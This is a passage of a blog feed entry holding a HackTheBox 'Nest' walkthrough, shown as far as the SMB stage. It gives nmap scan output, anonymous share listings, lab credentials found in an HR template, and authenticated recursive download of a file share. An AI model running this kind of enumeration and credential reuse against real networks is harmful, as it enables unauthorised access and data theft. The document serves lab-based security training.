<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HackTheBox - Nest üïäÔ∏èüê£</title>
      <link href="/2020-06-04/HackTheBox-Nest/"/>
      <url>/2020-06-04/HackTheBox-Nest/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/nest/nest-box.png" alt="HackTheBox-Nest" title="Nest"></p><hr><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   ‚Üí This machine is really awesome because it has a lot of enumeration especially on <code>SMBClient</code> side. you need a strong knowledge of active directory. Rated as <code>easy machine</code> but other says it is medium box because there is a debugging mode that beginner players have some trouble with it. But unlike other machine‚Äô this one I don‚Äôt have a proper shell.</p><hr><h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol><li><p><strong>Network Scanning</strong></p><p>‚Üí Nmap scan</p><p>‚Üí discover open ports and what services are running</p></li><li><p><strong>Enumeration</strong></p><p>‚Üí Service enumeration</p><p>‚Üí Enumeration <code>smb</code> shares</p><p>‚Üí In this phase there was a lot of <code>SMB</code> Enumeration‚Äô different files has discovered inside</p><p>‚Üí Analyzing the retrived content, some interesting at file <code>RU_Config.xml</code> and <code>config.xml</code></p></li><li><p><strong>Post - Exploitation</strong></p><p>‚Üí Analyze how the decrypting of password works `</p><p>‚Üí Decrypting the <code>password</code> with `dotnetfiddle</p><p>‚Üí running the script will give the password for <code>user</code></p></li><li><p><strong>Exploitation</strong></p><p>‚Üí Enumeration <code>C.Smith</code> user</p><p>‚Üí Login as <code>C.Smith</code> with <code>SMB</code></p><p>‚Üí finally got the <code>user.txt</code></p></li><li><p><strong>Privilege Escalation</strong></p><p>‚Üí I initially came across the <code>Debug Mode Password.txt</code></p><p>‚Üí <strong><code>HQK Reporting Service v1.2</code></strong> service running on port 4386</p><p>‚Üí Enumerate <code>HQK Reporting Service v1.2</code> with telnet and this will give a lot of informatio</p><p>‚Üí get and execute the <code>.exe</code> file ‚Äì <code>HqkLdap.exe</code> will give the <code>Administrator</code> password</p><p>‚Üí Finally get the <code>root.txt</code> flag but with <code>SMB Client</code></p></li></ol><hr><h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>‚Üí I always begin at <strong><em>NMAP</em></strong> to look on the services what is running. I always use</p><hr><ul><li>-sV      ‚áí Probe open ports to determine service/version info</li><li>-sC      ‚áí equivalent to ‚Äîscript=default</li><li>-A-      ‚áí Agressive scan</li><li>-oN      ‚áí to save our scan results to a text file</li></ul><hr><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">nmap -sV -sC -A 10.10.10.178 -oN nmap-Nest</span><br></pre></td></tr></table></figure><hr><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> ~/htb/Nest </span><br><span class="line">‚ùØ nmap -sV -sC -A <span class="number">10.10</span><span class="number">.10</span><span class="number">.178</span> -oN nmap-Nest</span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https:<span class="comment">//nmap.org ) at 2020-03-22 08:26 PST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.178</span></span><br><span class="line"><span class="function">Host <span class="keyword">is</span> <span class="title">up</span> (<span class="params"><span class="number">0.21</span>s latency</span>).</span></span><br><span class="line"><span class="function">Not shown: 999 filtered ports</span></span><br><span class="line"><span class="function">PORT    STATE SERVICE       VERSION</span></span><br><span class="line"><span class="function">445/tcp open  microsoft-ds?</span></span><br><span class="line"><span class="function">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span></span><br><span class="line"><span class="function">Device type: general purpose|phone|specialized</span></span><br><span class="line"><span class="function"><span class="title">Running</span> (<span class="params">JUST GUESSING</span>): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (<span class="params"><span class="number">92</span>%</span>)</span></span><br><span class="line"><span class="function">OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista:icrosoft:windows_server_2012:r2</span></span><br><span class="line"><span class="function">Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (<span class="params"><span class="number">92</span>%</span>), Microsoft Windows Phone 7.5 or 8.0 (<span class="params"><span class="number">92</span>%</span>), Microsoft Windows 7 or Windows Server 2008 <span class="title">R2</span> (<span class="params"><span class="number">91</span>%</span>), Microsoft Windows Server 2008 Rndows 8.1 (<span class="params"><span class="number">91</span>%</span>), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (<span class="params"><span class="number">91</span>%</span>), Microsoft Windows 7 (<span class="params"><span class="number">91</span>%</span>), Microsoft Windows 7 SP1 or Windows Server 2008 <span class="title">R2</span> (<span class="params"><span class="number">91</span>%</span>), Microsoft Windows Vista SP0 o1%), Microsoft Windows Embedded Standard 7 (<span class="params"><span class="number">91</span>%</span>)</span></span><br><span class="line"><span class="function">No exact OS matches <span class="keyword">for</span> <span class="title">host</span> (<span class="params">test conditions non-ideal</span>).</span></span><br><span class="line"><span class="function">Network Distance: 2 hops</span></span><br><span class="line"><span class="function">4386/tcp open  unknown</span></span><br><span class="line"><span class="function">[snip]</span></span><br><span class="line"><span class="function">|   Help: </span></span><br><span class="line"><span class="function">|     Reporting Service V1.2</span></span><br><span class="line"><span class="function">|     This service allows users to run queries against databases <span class="keyword">using</span> the legacy HQK format</span></span><br><span class="line"><span class="function">|     AVAILABLE COMMANDS ---</span></span><br><span class="line"><span class="function">|     LIST</span></span><br><span class="line"><span class="function">|     SETDIR &lt;Directory_Name&gt;</span></span><br><span class="line"><span class="function">|     RUNQUERY &lt;Query_ID&gt;</span></span><br><span class="line"><span class="function">|     DEBUG &lt;Password&gt;</span></span><br><span class="line"><span class="function">|_    HELP &lt;Command&gt;</span></span><br><span class="line"><span class="function">[snip]</span></span><br><span class="line"><span class="function">Host script results:</span></span><br><span class="line"><span class="function">|_clock-skew: 2m26s</span></span><br><span class="line"><span class="function">| smb2-security-mode: </span></span><br><span class="line"><span class="function">|   2.02: </span></span><br><span class="line"><span class="function">|_    Message signing enabled but not required</span></span><br><span class="line"><span class="function">| smb2-time: </span></span><br><span class="line"><span class="function">|   date: 2020-03-22T00:29:42</span></span><br><span class="line"><span class="function">|_  start_date: 2020-03-21T23:00:50</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">TRACEROUTE</span> (<span class="params"><span class="keyword">using</span> port <span class="number">445</span>/tcp</span>)</span></span><br><span class="line"><span class="function">HOP RTT       ADDRESS</span></span><br><span class="line"><span class="function">1   223.12 ms 10.10.14.1</span></span><br><span class="line"><span class="function">2   223.23 ms 10.10.10.178</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">OS and Service detection performed. Please report any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span></span><br><span class="line"><span class="function">Nmap done: 1 IP <span class="title">address</span> (<span class="params"><span class="number">1</span> host up</span>) scanned <span class="keyword">in</span> 112.08 seconds</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">root <span class="keyword">in</span> ~/htb/Nest took 1m52s </span></span><br><span class="line"><span class="function">‚ùØ</span></span><br></pre></td></tr></table></figure><hr><h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p>So there‚Äôs only 2 port open.</p><ul><li>445       ‚áí which is <code>SMB Client</code></li><li>4386       ‚áí this port is unknow. but in <code>nmap</code> results it has a service of <code>HQK Service</code></li></ul><hr><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>Since TCP/445 is open, we can take a look to see what shares are available:</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest</span><br><span class="line">‚ùØ smbclient -L \\\\<span class="number">10.10</span><span class="number">.10</span><span class="number">.178</span></span><br><span class="line">Enter WORKGROUP\root<span class="string">'s password: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Sharename       Type      Comment</span></span><br><span class="line"><span class="string">        ---------       ----      -------</span></span><br><span class="line"><span class="string">        ADMIN$          Disk      Remote Admin</span></span><br><span class="line"><span class="string">        C$              Disk      Default share</span></span><br><span class="line"><span class="string">        Data            Disk      </span></span><br><span class="line"><span class="string">        IPC$            IPC       Remote IPC</span></span><br><span class="line"><span class="string">        Secure$         Disk      </span></span><br><span class="line"><span class="string">        Users           Disk      </span></span><br><span class="line"><span class="string">SMB1 disabled -- no workgroup available</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root in htb/boxes/Nest</span></span><br><span class="line"><span class="string">‚ùØ</span></span><br></pre></td></tr></table></figure><p>The <code>Data</code> share seems to be accessible anonymously. We can recursively list the contents of the share with <code>smbclient</code> so :</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ smbclient  \\\\<span class="number">10.10</span><span class="number">.10</span><span class="number">.178</span>\\Data</span><br><span class="line">Enter WORKGROUP\root<span class="string">'s password: </span></span><br><span class="line"><span class="string">Try "help" to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; recurse on</span></span><br><span class="line"><span class="string">smb: \&gt; ls</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 06:53:46 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 06:53:46 2019</span></span><br><span class="line"><span class="string">  IT                                  D        0  Thu Aug  8 06:58:07 2019</span></span><br><span class="line"><span class="string">  Production                          D        0  Tue Aug  6 05:53:38 2019</span></span><br><span class="line"><span class="string">  Reports                             D        0  Tue Aug  6 05:53:44 2019</span></span><br><span class="line"><span class="string">  Shared                              D        0  Thu Aug  8 03:07:51 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT</span></span><br><span class="line"><span class="string">NT_STATUS_ACCESS_DENIED listing \IT\*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Production</span></span><br><span class="line"><span class="string">NT_STATUS_ACCESS_DENIED listing \Production\*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Reports</span></span><br><span class="line"><span class="string">NT_STATUS_ACCESS_DENIED listing \Reports\*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Shared</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:07:51 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:07:51 2019</span></span><br><span class="line"><span class="string">  Maintenance                         D        0  Thu Aug  8 03:07:32 2019</span></span><br><span class="line"><span class="string">  Templates                           D        0  Thu Aug  8 03:08:07 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Shared\Maintenance</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:07:32 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:07:32 2019</span></span><br><span class="line"><span class="string">  Maintenance Alerts.txt              A       48  Tue Aug  6 07:01:44 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Shared\Templates</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:08:07 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:08:07 2019</span></span><br><span class="line"><span class="string">  HR                                  D        0  Thu Aug  8 03:08:01 2019</span></span><br><span class="line"><span class="string">  Marketing                           D        0  Thu Aug  8 03:08:06 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Shared\Templates\HR</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:08:01 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:08:01 2019</span></span><br><span class="line"><span class="string">  Welcome Email.txt                   A      425  Thu Aug  8 06:55:36 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Shared\Templates\Marketing</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:08:06 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:08:06 2019</span></span><br><span class="line"><span class="string">smb: \&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">smb: \&gt; cd \Shared\Templates\HR</span></span><br><span class="line"><span class="string">smb: \Shared\Templates\HR\&gt; ls                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:08:01 2019                                                                                                                                                                </span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:08:01 2019                                                                                                                                                                </span></span><br><span class="line"><span class="string">  Welcome Email.txt                   A      425  Thu Aug  8 06:55:36 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                10485247 blocks of size 4096. 6543883 blocks available</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">smb: \Shared\Templates\HR\&gt;</span></span><br></pre></td></tr></table></figure><p>To easily listed all the directory i use the command <code>recurse on</code>, and as you can see‚Äô there was a potential files which is the <code>Maintenance Alerts.txt</code> and <code>Welcome Email.txt</code>. I download it with <code>smbclient</code> :</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">smb: \Shared\Templates\HR\&gt; mget <span class="string">"Welcome Email.txt"</span></span><br><span class="line">Get file Welcome Email.txt? y</span><br><span class="line">getting file \Shared\Templates\HR\Welcome Email.txt of size <span class="number">425</span> <span class="keyword">as</span> Welcome Email.txt (<span class="number">0.4</span> KiloBytes/sec) (average <span class="number">0.4</span> KiloBytes/sec)</span><br><span class="line">smb: \Shared\Templates\HR\&gt;</span><br></pre></td></tr></table></figure><p>Then let‚Äôs read the what‚Äôs the content of <code>.txt</code> file :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ cat <span class="string">'Welcome Email.txt'</span> </span><br><span class="line">We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;</span><br><span class="line"></span><br><span class="line">You will find your home folder <span class="keyword">in</span> the following location: </span><br><span class="line">\\HTB-NEST\Users\&lt;USERNAME&gt;</span><br><span class="line"></span><br><span class="line">If you have any issues accessing specific services or workstations, please inform the </span><br><span class="line">IT department and use the credentials below until all systems have been <span class="built_in">set</span> up <span class="keyword">for</span> you.</span><br><span class="line"></span><br><span class="line">Username: TempUser</span><br><span class="line">Password: welcome2019</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Thank you</span><br><span class="line">HR</span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>Next is the <code>Maintenance Alerts.txt</code></p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">Current directory <span class="keyword">is</span> \Shared\Templates\HR\</span><br><span class="line">smb: \Shared\Templates\HR\&gt; cd /</span><br><span class="line">smb: \&gt; cd \Shared\Maintenance</span><br><span class="line">smb: \Shared\Maintenance\&gt; ls</span><br><span class="line">  .                                   D        <span class="number">0</span>  Thu Aug  <span class="number">8</span> <span class="number">03</span>:<span class="number">07</span>:<span class="number">32</span> <span class="number">2019</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Thu Aug  <span class="number">8</span> <span class="number">03</span>:<span class="number">07</span>:<span class="number">32</span> <span class="number">2019</span></span><br><span class="line">  Maintenance Alerts.txt              A       <span class="number">48</span>  Tue Aug  <span class="number">6</span> <span class="number">07</span>:<span class="number">01</span>:<span class="number">44</span> <span class="number">2019</span></span><br><span class="line"></span><br><span class="line">                <span class="number">10485247</span> blocks of size <span class="number">4096.</span> <span class="number">6543883</span> blocks available</span><br><span class="line">smb: \Shared\Maintenance\&gt; mget <span class="string">"Maintenance Alerts.txt"</span></span><br><span class="line">Get file Maintenance Alerts.txt? y</span><br><span class="line">getting file \Shared\Maintenance\Maintenance Alerts.txt of size <span class="number">48</span> <span class="keyword">as</span> Maintenance Alerts.txt (<span class="number">0.0</span> KiloBytes/sec) (average <span class="number">0.1</span> KiloBytes/sec)</span><br><span class="line">smb: \Shared\Maintenance\&gt;</span><br></pre></td></tr></table></figure><p>Then read the content :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ cat <span class="string">'Maintenance Alerts.txt'</span> </span><br><span class="line">There is currently no scheduled maintenance work</span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>Not much interesting so let‚Äôs move another phase.</p><h3 id="Enumerating-SMB-Shares"><a href="#Enumerating-SMB-Shares" class="headerlink" title="Enumerating SMB Shares"></a>Enumerating SMB Shares</h3><p>The <code>Welcome Email.txt</code> give us credentials of <code>TempUser</code>. so I‚Äôll try it to <code>smbclient</code> then let‚Äôs see if gives us any further access to the <code>Data</code> share so :</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ smbclient  \\\\<span class="number">10.10</span><span class="number">.10</span><span class="number">.178</span>\\Data -U TempUser</span><br><span class="line">Enter WORKGROUP\TempUser<span class="string">'s password: </span></span><br><span class="line"><span class="string">Try "help" to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; recurse on</span></span><br><span class="line"><span class="string">smb: \&gt; ls</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 06:53:46 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 06:53:46 2019</span></span><br><span class="line"><span class="string">  IT                                  D        0  Thu Aug  8 06:58:07 2019</span></span><br><span class="line"><span class="string">  Production                          D        0  Tue Aug  6 05:53:38 2019</span></span><br><span class="line"><span class="string">  Reports                             D        0  Tue Aug  6 05:53:44 2019</span></span><br><span class="line"><span class="string">  Shared                              D        0  Thu Aug  8 03:07:51 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 06:58:07 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 06:58:07 2019</span></span><br><span class="line"><span class="string">  Archive                             D        0  Tue Aug  6 06:33:58 2019</span></span><br><span class="line"><span class="string">  Configs                             D        0  Thu Aug  8 06:59:34 2019</span></span><br><span class="line"><span class="string">  Installs                            D        0  Thu Aug  8 06:08:30 2019</span></span><br><span class="line"><span class="string">  Reports                             D        0  Sun Jan 26 08:09:13 2020</span></span><br><span class="line"><span class="string">  Tools                               D        0  Tue Aug  6 06:33:43 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Production</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 05:53:38 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 05:53:38 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Reports</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 05:53:44 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 05:53:44 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Shared</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:07:51 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:07:51 2019</span></span><br><span class="line"><span class="string">  Maintenance                         D        0  Thu Aug  8 03:07:32 2019</span></span><br><span class="line"><span class="string">  Templates                           D        0  Thu Aug  8 03:08:07 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Archive</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 06:33:58 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 06:33:58 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Configs</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 06:59:34 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 06:59:34 2019</span></span><br><span class="line"><span class="string">  Adobe                               D        0  Thu Aug  8 03:20:09 2019</span></span><br><span class="line"><span class="string">  Atlas                               D        0  Tue Aug  6 19:16:18 2019</span></span><br><span class="line"><span class="string">  DLink                               D        0  Tue Aug  6 21:25:27 2019</span></span><br><span class="line"><span class="string">  Microsoft                           D        0  Thu Aug  8 03:23:26 2019</span></span><br><span class="line"><span class="string">  NotepadPlusPlus                     D        0  Thu Aug  8 03:31:37 2019</span></span><br><span class="line"><span class="string">  RU Scanner                          D        0  Thu Aug  8 04:01:13 2019</span></span><br><span class="line"><span class="string">  Server Manager                      D        0  Tue Aug  6 21:25:19 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Installs</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 06:08:30 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 06:08:30 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Reports</span></span><br><span class="line"><span class="string">  .                                   D        0  Sun Jan 26 08:09:13 2020</span></span><br><span class="line"><span class="string">  ..                                  D        0  Sun Jan 26 08:09:13 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Tools</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 06:33:43 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 06:33:43 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Shared\Maintenance</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:07:32 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:07:32 2019</span></span><br><span class="line"><span class="string">  Maintenance Alerts.txt              A       48  Tue Aug  6 07:01:44 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Shared\Templates</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:08:07 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:08:07 2019</span></span><br><span class="line"><span class="string">  HR                                  D        0  Thu Aug  8 03:08:01 2019</span></span><br><span class="line"><span class="string">  Marketing                           D        0  Thu Aug  8 03:08:06 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Configs\Adobe</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:20:09 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:20:09 2019</span></span><br><span class="line"><span class="string">  editing.xml                        AH      246  Sat Aug  3 20:58:42 2019</span></span><br><span class="line"><span class="string">  Options.txt                         A        0  Tue Oct 11 05:11:14 2011</span></span><br><span class="line"><span class="string">  projects.xml                        A      258  Wed Jan  9 00:30:52 2013</span></span><br><span class="line"><span class="string">  settings.xml                        A     1274  Thu Aug  8 03:19:12 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Configs\Atlas</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 19:16:18 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 19:16:18 2019</span></span><br><span class="line"><span class="string">  Temp.XML                            A     1369  Wed Jun 11 15:38:22 2003</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Configs\DLink</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 21:25:27 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 21:25:27 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Configs\Microsoft</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:23:26 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:23:26 2019</span></span><br><span class="line"><span class="string">  Options.xml                         A     4598  Sun Mar  4 03:24:24 2012</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Configs\NotepadPlusPlus</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:31:37 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:31:37 2019</span></span><br><span class="line"><span class="string">  config.xml                          A     6451  Thu Aug  8 07:01:25 2019</span></span><br><span class="line"><span class="string">  shortcuts.xml                       A     2108  Thu Aug  8 03:30:27 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Configs\RU Scanner</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 04:01:13 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 04:01:13 2019</span></span><br><span class="line"><span class="string">  RU_config.xml                       A      270  Fri Aug  9 03:49:37 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Configs\Server Manager</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 21:25:19 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 21:25:19 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Shared\Templates\HR</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:08:01 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:08:01 2019</span></span><br><span class="line"><span class="string">  Welcome Email.txt                   A      425  Thu Aug  8 06:55:36 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Shared\Templates\Marketing</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:08:06 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:08:06 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                10485247 blocks of size 4096. 6543883 blocks available</span></span><br><span class="line"><span class="string">smb: \&gt;</span></span><br></pre></td></tr></table></figure><p>Looks like we have access to a some files in the <strong><code>IT</code></strong> directory now. I just recursively pull down all the files in the share so :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ smbget -R  smb://10.10.10.178/Data/ -U TempUser</span><br><span class="line">Password <span class="keyword">for</span> [TempUser] connecting to //Data/10.10.10.178: </span><br><span class="line">Using workgroup WORKGROUP, user TempUser</span><br><span class="line">smb://10.10.10.178/Data//IT/Configs/Adobe/editing.xml                                                                                                                                                                                     </span><br><span class="line">smb://10.10.10.178/Data//IT/Configs/Adobe/Options.txt                                                                                                                                                                                     </span><br><span class="line">smb://10.10.10.178/Data//IT/Configs/Adobe/projects.xml                                                                                                                                                                                    </span><br><span class="line">smb://10.10.10.178/Data//IT/Configs/Adobe/settings.xml                                                                                                                                                                                    </span><br><span class="line">smb://10.10.10.178/Data//IT/Configs/Atlas/Temp.XML                                                                                                                                                                                        </span><br><span class="line">smb://10.10.10.178/Data//IT/Configs/Microsoft/Options.xml                                                                                                                                                                                 </span><br><span class="line">smb://10.10.10.178/Data//IT/Configs/NotepadPlusPlus/config.xml                                                                                                                                                                            </span><br><span class="line">smb://10.10.10.178/Data//IT/Configs/NotepadPlusPlus/shortcuts.xml                                                                                                                                                                         </span><br><span class="line">smb://10.10.10.178/Data//IT/Configs/RU Scanner/RU_config.xml                                                                                                                                                                              </span><br><span class="line">smb://10.10.10.178/Data//Shared/Maintenance/Maintenance Alerts.txt                                                                                                                                                                        </span><br><span class="line">smb://10.10.10.178/Data//Shared/Templates/HR/Welcome Email.txt                                                                                                                                                                            </span><br><span class="line">Downloaded 16.65kB <span class="keyword">in</span> 95 seconds</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest took 1m34s </span><br><span class="line">‚ùØ ls</span><br><span class="line"> IT  <span class="string">'Maintenance Alerts.txt'</span>   nmap-Nest   Production   Reports   Shared  <span class="string">'Welcome Email.txt'</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>When I enumerate all the files 1 by 1 on my operating system i found interesting stuff ‚Äì <code>RU_Config.xml</code> and <code>config.xml</code> inside this directory <strong>/IT/Configs/RU Scanner/RU_Config.xml</strong></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> 